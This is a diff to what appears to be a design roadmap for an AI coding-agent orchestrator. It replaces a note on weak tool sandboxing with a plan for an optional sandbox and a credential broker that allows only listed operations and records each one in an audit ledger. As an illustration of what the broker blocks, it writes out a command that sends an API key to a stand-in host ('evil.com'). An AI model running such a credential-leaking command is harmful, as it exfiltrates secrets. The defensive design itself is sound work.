@@ -143,11 +143,23 @@ module-locality from the touched-file set to decide what can parallelize.
   request construction) — build it there or as a sibling. Limits: don't mix
   env-based and injected-fetch proxying; `fetch` injection does not affect
   WebSocket transports.
-- **Tool sandboxing** — the runner roots tools at targetDir but the bash tool is
-  a starting cwd, NOT a jail: an agent can `cd` out, read/write outside, reach the
-  network. Real isolation (container/seccomp/egress-deny) is out-of-process work;
-  `activeToolNames` (which tools a role enables) is the only current gate. Needed
-  before unsupervised runs on an untrusted task.
+- **Sandbox + credential broker** — upgrades the runner's honest limit (targetDir
+  is a starting cwd, not a jail). Prior art: the operator's
+  github.com/aadegtyarev/claude-orchestrator (bwrap sandbox seeing only the work
+  dir + own home, ~/.ssh and neighbors cut off; a host-side `vault` daemon that
+  keeps secrets on the host and runs git/gh/curl with creds injected, the session
+  seeing only a marker). ad-coder version, better-fit to our idioms: (1) both are
+  OPTIONAL INJECTED SEAMS — `Sandbox` (bwrap = Linux impl; microVM / macOS
+  sandbox-exec / container / none = others, never a hard dep) and
+  `CredentialBroker`; (2) the broker exposes an ALLOW-LIST OF OPERATIONS
+  (gitPush(branch), ghPr, curl to allowed hosts) NOT arbitrary-command-with-cred,
+  so even through the broker no `curl evil.com -H Authorization:$KEY` — policy is
+  operation-shaped; (3) every privileged op is LEDGER-AUDITED (role/op/allow-deny),
+  the observability that makes it trustworthy; (4) composes with the runner's
+  credential boundary (half one) + broker-ops-as-tools under activeToolNames +
+  tool-usage observability. Makes allow-list ≠ sandbox concrete: allow-list =
+  economy/intent, sandbox+broker = the hard boundary. Needed before unsupervised
+  runs on an untrusted task.
 - **Prompts as files** — roles reference prompts by name from files, not only
   inline strings. Both prompts already exist (Role.systemPrompt verbatim; the task
   prompt via runRole) — the gap is storage. Resolve at the boundary (name → file →
